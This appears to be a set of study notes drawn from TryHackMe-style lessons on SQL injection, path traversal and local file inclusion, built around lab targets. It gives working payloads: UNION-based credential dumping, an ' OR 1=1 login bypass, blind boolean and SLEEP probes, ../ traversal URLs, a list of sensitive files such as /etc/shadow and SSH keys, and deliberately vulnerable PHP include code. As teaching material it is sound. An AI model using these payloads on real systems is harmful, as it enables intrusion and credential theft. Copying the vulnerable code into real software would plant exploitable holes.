<p><code>delete from users;</code></p>
<p><br><br>&nbsp;</p>
<p>Because no WHERE clause was being used in the query, all the data is deleted in the table.<br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<h4>SQL Injection</h4>
<p>The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.</p>
<p><strong>What does it look like?</strong><br>Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like this:<br><br><code>https://website.thm/blog?id=1</code><br><br>From the URL above, you can see that the blog entry been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:<br><br><code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code><br><br>From what you've learned in the previous task, you should be able to work out that the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.<br><br>As was mentioned at the start of this task, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.<br><br>Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:<br>&nbsp;<br><code>https://website.thm/blog?id=2;--</code><br><br>Which would then, in turn, produce the SQL statement:<br><br><code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code><br><br><strong>The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment</strong>. By doing this, you're just, in fact, running the query:<br><br><code>SELECT * from blog where id=2;--</code><br><br>Which will return the article with an id of 2 whether it is set to public or not.</p>
<p>&nbsp;</p>
<h4>In band SQL Injection</h4>
<p>In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.</p>
<p>&nbsp;</p>
<p><strong>Error-Based SQL Injection</strong></p>
<p>This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.&nbsp;</p>
<p>&nbsp;</p>
<p><strong>Union-Based SQL Injection</strong></p>
<p>This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.</p>
<p>&nbsp;</p>
<p><strong>Practical:</strong></p>
<p><strong>Click the green "Start Machine" button to use the SQL Injection Example practice lab. Each level contains a mock browser and also SQL Query and Error boxes to assist in getting your queries/payload correct.</strong><br><br>&nbsp;</p>
<p>Level one of the practice lab contains a mock browser and website featuring a blog with different articles, which can be accessed by changing the id number in the query string.</p>
<p>&nbsp;</p>
<p>The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).</p>
<p>&nbsp;</p>
<p>Try typing an apostrophe (&nbsp;<strong>'</strong>&nbsp;) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure.&nbsp;</p>
<p>&nbsp;</p>
<p>The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:</p>
<p>&nbsp;</p>
<p><code>1 UNION SELECT 1</code></p>
<p>&nbsp;</p>
<p>This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:</p>
<p>&nbsp;</p>
<p><code>1 UNION SELECT 1,2</code></p>
<p>&nbsp;</p>
<p>Same error again, so let's repeat by adding another column:</p>
<p>&nbsp;</p>
<p><code>1 UNION SELECT 1,2,3</code></p>
<p>&nbsp;</p>
<p>Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.</p>
<p>&nbsp;</p>
<p><code>0 UNION SELECT 1,2,3</code></p>
<p>&nbsp;</p>
<p>You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:</p>
<p>&nbsp;</p>
<p><code>0 UNION SELECT 1,2,database()</code></p>
<p>&nbsp;</p>
<p>You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is&nbsp;<strong>sqli_one</strong>.</p>
<p>&nbsp;</p>
<p>Our next query will gather a list of tables that are in this database.</p>
<p>&nbsp;</p>
<p><code>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'</code></p>
<p>&nbsp;</p>
<p>There are a couple of new things to learn in this query. Firstly, the method&nbsp;<strong>group_concat()</strong>&nbsp;gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the&nbsp;<strong>information_schema</strong>&nbsp;database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the&nbsp;<strong>sqli_one</strong>&nbsp;database, which is article and staff_users.&nbsp;</p>
<p>&nbsp;</p>
<p>As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.</p>
<p>&nbsp;</p>
<p><code>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</code></p>
<p>&nbsp;</p>
<p>This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to&nbsp;<strong>column_name</strong>, the table we are querying in the information_schema database has changed from tables to&nbsp;<strong>columns</strong>, and we're searching for any rows where the&nbsp;<strong>table_name</strong>&nbsp;column has a value of&nbsp;<strong>staff_users</strong>.</p>
<p>&nbsp;</p>
<p>The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.</p>
<p>&nbsp;</p>
<p><code>0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users</code></p>
<p>&nbsp;</p>
<p>Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added&nbsp;<strong>,':',</strong>&nbsp;to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML&nbsp;<strong>&lt;br&gt;</strong>&nbsp;tag that forces each result to be on a separate line to make for easier reading.</p>
<p>&nbsp;</p>
<h4>Blind SQL Injection, authentication bypass</h4>
<p>Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.<br><br>&nbsp;</p>
<p><strong>Authentication Bypass</strong></p>
<p>One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login.&nbsp;</p>
<p>&nbsp;</p>
<p>Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username&nbsp;<strong>bob</strong>&nbsp;and the password&nbsp;<strong>bob123</strong>?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not.&nbsp;</p>
<p>&nbsp;</p>
<p>Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.</p>
<p>&nbsp;</p>
<p><strong>Practical:</strong></p>
<p>Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:</p>
<p>&nbsp;</p>
<p><code>select * from users where username='%username%' and password='%password%' LIMIT 1;</code></p>
<p>&nbsp;</p>
<p>N.B The&nbsp;<strong>%username%</strong>&nbsp;and&nbsp;<strong>%password%</strong>&nbsp;values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.</p>
<p>&nbsp;</p>
<p>To make this into a query that always returns as true, we can enter the following into the password field:</p>
<p>&nbsp;</p>
<p><code>' OR 1=1;--</code></p>
<p>&nbsp;</p>
<p>Which turns the SQL query into the following:</p>
<p>&nbsp;</p>
<p><code>select * from users where username='' and password='' OR 1=1;</code></p>
<p>&nbsp;</p>
<p>Because 1=1 is a true statement and we've used an&nbsp;<strong>OR</strong>&nbsp;operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.</p>
<p>&nbsp;</p>
<h4>Blind SQL Injection, Boolean</h4>
<p>Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.</p>
<p>&nbsp;</p>
<p><strong>Practical:</strong></p>
<p>On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:</p>
<p>&nbsp;</p>
<p><strong>https://website.thm/checkuser?username=admin</strong></p>
<p>&nbsp;</p>
<p>The browser body contains the contents of&nbsp;<strong>{"taken":true}</strong>. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the&nbsp;<strong>taken</strong>&nbsp;value is set to&nbsp;<strong>true</strong>, we can assume the username admin is already registered. In fact, we can confirm this by changing the username in the mock browser's address bar from&nbsp;<strong>admin</strong>&nbsp;to&nbsp;<strong>admin123</strong>, and upon pressing enter, you'll see the value&nbsp;<strong>taken</strong>&nbsp;has now changed to&nbsp;<strong>false</strong>.</p>
<p>&nbsp;</p>
<p>The SQL query that is processed looks like the following:</p>
<p>&nbsp;</p>
<p><code>select * from users where username = '%username%' LIMIT 1;</code></p>
<p>&nbsp;</p>
<p>As the only input, we have control over is the username in the query string, we'll have to use this to perform our SQL Injection. Keeping the username as&nbsp;<strong>admin123</strong>, we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.</p>
<p>&nbsp;</p>
<p>Like in previous levels, our first task is to establish the number of columns in the users table, which we can achieve by using the UNION statement. Change the username value to the following:</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1;--&nbsp;</code></p>
<p>&nbsp;</p>
<p>As the web application has responded with the value&nbsp;<strong>taken</strong>&nbsp;as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a&nbsp;<strong>taken</strong>&nbsp;value of&nbsp;<strong>true</strong>. You can confirm that the answer is three columns by setting the username to the below value:</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3;--&nbsp;</code></p>
<p>&nbsp;</p>
<p>Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is discovering the database name. We can do this by using the built-in&nbsp;<strong>database()</strong>&nbsp;method and then using the&nbsp;<strong>like</strong>&nbsp;operator to try and find results that will return a true status.</p>
<p>Try the below username value and see what happens:</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 where database() like '%';--</code></p>
<p>&nbsp;</p>
<p>We get a true response because, in the like operator, we just have the value of&nbsp;<strong>%</strong>, which will match anything as it's the wildcard value. If we change the wildcard operator to&nbsp;<strong>a%</strong>, you'll see the response goes back to false, which confirms that the database name does not begin with the letter&nbsp;<strong>a</strong>. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a&nbsp;<strong>true</strong>&nbsp;response that confirms the database name begins with the letter&nbsp;<strong>s</strong>.</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code></p>
<p>&nbsp;</p>
<p>Now you move onto the next character of the database name until you find another&nbsp;<strong>true</strong>&nbsp;response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name, which is&nbsp;<strong>sqli_three</strong>.</p>
<p>&nbsp;</p>
<p>We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--</code></p>
<p>&nbsp;</p>
<p>This query looks for results in the&nbsp;<strong>information_schema</strong>&nbsp;database in the&nbsp;<strong>tables</strong>&nbsp;table where the database name matches&nbsp;<strong>sqli_three</strong>, and the table name begins with the letter a. As the above query results in a&nbsp;<strong>false</strong>&nbsp;response, we can confirm that there are no tables in the sqli_three database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.</p>
<p>&nbsp;</p>
<p>You'll finally end up discovering a table in the sqli_three database named users, which you can be confirmed by running the following username payload:</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--</code></p>
<p>&nbsp;</p>
<p>Lastly, we now need to enumerate the column names in the&nbsp;<strong>users</strong>&nbsp;table so we can properly search it for login credentials. Again using the information_schema database and the information we've already gained, we can start querying it for column names. Using the payload below, we search the&nbsp;<strong>columns</strong>&nbsp;table where the database is equal to sqli_three, the table name is users, and the column name begins with the letter a.</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';</code></p>
<p>&nbsp;</p>
<p>Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named&nbsp;<strong>id</strong>, you'll append that to your original payload (as seen below).</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';</code></p>
<p>&nbsp;</p>
<p>Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the&nbsp;<strong>users</strong>&nbsp;table for login credentials. First, you'll need to discover a valid username which you can use the payload below:</p>
<p>&nbsp;</p>
<p><code>admin123' UNION SELECT 1,2,3 from users where username like 'a%</code></p>
<p>&nbsp;</p>
<p>Which, once you've cycled through all the characters, you will confirm the existence of the username&nbsp;<strong>admin</strong>. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:</p>
<p>&nbsp;</p>
<h4>SQL Injection, time based</h4>
<p>&nbsp;</p>
<p>A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as&nbsp;SLEEP(x)&nbsp;alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.&nbsp;</p>
<p>&nbsp;</p>
<p>So, for example, when trying to establish the number of columns in a table, you would use the following query:</p>
<p>&nbsp;</p>
<p>admin123' UNION SELECT SLEEP(5);--</p>
<p>&nbsp;</p>
<p>If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:</p>
<p>&nbsp;</p>
<p>admin123' UNION SELECT SLEEP(5),2;--</p>
<p>&nbsp;</p>
<p>This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.</p>
<p>&nbsp;</p>
<p>You can now repeat the enumeration process from the Boolean based SQL Injection, adding the&nbsp;SLEEP()&nbsp;method into the&nbsp;UNION SELECT&nbsp;statement.</p>
<p>If you're struggling to find the table name the below query should help you on your way:</p>
<p><br>referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--</p>
<p>&nbsp;</p>
<h4>Out of band SQL Injection</h4>
<p>Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.<br><br>An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.</p>
<p>1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.</p>
<p>2) The Website makes an SQL query to the database which also passes the hacker's payload.</p>
<p>3) The payload contains a request which forces an&nbsp;HTTP&nbsp;request back to the hacker's machine containing data from the database.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image057.png"></figure>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h3>Path traversal</h3>
<p><br>Also known as&nbsp;Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.</p>
<p>Path&nbsp;traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.&nbsp;In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function&nbsp;<a href="https://www.php.net/manual/en/function.file-get-contents.php">here</a>.</p>
<p>The following graph shows how a web application stores files in&nbsp;/var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path&nbsp;/var/www/app/CVs.<br><br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image059.png"></figure>
<p>We&nbsp;can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the&nbsp;dot-dot-slash&nbsp;attack, take advantage of moving the directory one step up using the double dots&nbsp;../.&nbsp;If the attacker finds the entry point, which in this case&nbsp;get.php?file=, then the attacker may send something as follows,&nbsp;http://webapp.thm/get.php?file=../../../../etc/passwd<br><br>&nbsp;</p>
<p>Suppose there isn't input validation, and instead of accessing the PDF files at&nbsp;/var/www/app/CVs&nbsp;location, the web application retrieves files from other directories, which in this case&nbsp;/etc/passwd. Each&nbsp;..&nbsp;entry moves one directory until it reaches the root directory&nbsp;/. Then it changes the directory to&nbsp;/etc, and from there, it read the&nbsp;passwd&nbsp;file.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image061.png"></figure>
<p>&nbsp;</p>
<p>As a result, the web application sends back the file's content to the user.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image063.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the&nbsp;boot.ini&nbsp;file located in&nbsp;c:\boot.ini, then the attacker can try the following depending on the target OS version:</p>
<p>http://webapp.thm/get.php?file=../../../../boot.ini&nbsp;or</p>
<p>http://webapp.thm/get.php?file=../../../../windows/win.ini<br><br>&nbsp;</p>
<p>The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually&nbsp;c:\.</p>
<p>Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common&nbsp;OS files you could use when testing.&nbsp;</p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Location</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Description</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/etc/issue</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">contains a message or system identification to be printed before the login prompt.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/etc/profile</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">controls system-wide default variables, such as&nbsp;Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/proc/version</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">specifies the version of the Linux kernel</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/etc/passwd</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">has all registered user that has access to a system</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/etc/shadow</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">contains information about the system's users' passwords</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/root/.bash_history</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">contains the history commands for&nbsp;root&nbsp;user</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/var/log/dmessage</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">contains global system messages, including the messages that are logged during system startup</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/var/mail/root</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">all emails for&nbsp;root&nbsp;user</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/root/.ssh/id_rsa</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Private SSH keys for a root or any known valid user on the server</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">/var/log/apache2/access.log</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">the accessed requests for&nbsp;Apache&nbsp;&nbsp;webserver</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">C:\boot.ini</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">contains the boot options for computers with BIOS firmware</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h3>Local file inclusion</h3>
<p>This room aims to equip you with the essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. Also, we will discuss the risk of these vulnerabilities if they're found and the required remediation. We provide some practical examples of each vulnerability as well as hands-on challenges.</p>
<p>In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters.&nbsp;Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.&nbsp;The following graph explains and breaking down the essential parts of the URL.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image065.png"></figure>
<p><br><br>&nbsp;</p>
<p>For example, parameters are used with Google searching, where&nbsp;GET&nbsp;requests pass user input into the search engine.&nbsp;https://www.google.com/search?q=TryHackMe. If you are not familiar with the topic, you can view the&nbsp;<a href="https://tryhackme.com/module/how-the-web-works">How The Web Works</a>&nbsp;module to understand the concept.&nbsp;&nbsp;</p>
<p>Let's discuss a scenario where a user requests to access files from a webserver.&nbsp;First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows,&nbsp;http://webapp.thm/get.php?file=userCV.pdf, where the&nbsp;file&nbsp;is the parameter and the&nbsp;userCV.pdf, is the required file to access.<strong></strong></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image067.png"></figure>
<p><strong>Why do File inclusion vulnerabilities happen?</strong></p>
<p>File inclusion vulnerabilities are commonly found and exploited in various programming&nbsp;languages&nbsp;for web applications, such as PHP&nbsp;that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.</p>
<p><br><br>&nbsp;</p>
<p><strong>What is the risk of File inclusion?</strong></p>
<p>It depends! If the attacker can use file inclusion vulnerabilities to read sensitive data. In that case, the successful attack causes to leak of sensitive data, including code and files related to the web application, credentials for back-end systems. Moreover, if the attacker somehow can write to the server such as&nbsp; /tmp&nbsp;directory, then it is possible to gain remote command execution RCE. However, it won't be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server.</p>
<p>&nbsp;</p>
<p>Local File Inclusion (LFI)</p>
<p>LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as&nbsp;include,&nbsp;require,&nbsp;include_once, and&nbsp;require_once&nbsp;often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.</p>
<p>In this section, we will walk you through various&nbsp;LFI&nbsp;scenarios and how to exploit them.</p>
<p><strong>1.</strong>&nbsp;Suppose the web application provides two languages, and the user can select between the&nbsp;EN&nbsp;and&nbsp;AR</p>
<p><strong>&lt;?PHP</strong>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; include($_GET["lang"]);</p>
<p><strong>?&gt;</strong></p>
<p>The PHP code above uses a&nbsp;GET&nbsp;request via the URL parameter&nbsp;lang&nbsp;to include the file of the page.&nbsp;The call can be done by sending the following HTTP&nbsp;request as follows:&nbsp;http://webapp.thm/index.php?lang=EN.php&nbsp;to load the English page or&nbsp;http://webapp.thm/index.php?lang=AR.php&nbsp;to load the Arabic page, where&nbsp;EN.php&nbsp;and&nbsp;AR.php&nbsp;files exist in the same directory.</p>
<p>Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the&nbsp;/etc/passwd&nbsp;file, which contains sensitive information about the users of the Linux operating system, we can try the following:&nbsp;http://webapp.thm/get.php?file=/etc/passwd&nbsp;</p>
<p>In this case, it works because there isn't a directory specified in the&nbsp;include&nbsp;function and no input validation.</p>
<p><u>Now apply what we discussed and try to read&nbsp;/etc/passwd&nbsp;file. Also, answer question #1 below.</u></p>
<p>&nbsp;</p>
<p><strong>2.</strong>&nbsp;Next, In the following code, the developer decided to specify the directory inside the function.</p>
<p><strong>&lt;?PHP</strong>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; include("languages/".&nbsp;$_GET['lang']);&nbsp;</p>
<p><strong>?&gt;</strong></p>
<p>In the above code, the developer decided to use the&nbsp;include&nbsp;function to call&nbsp;PHP&nbsp;pages in the&nbsp;languages&nbsp;directory only via&nbsp;lang&nbsp;parameters.</p>
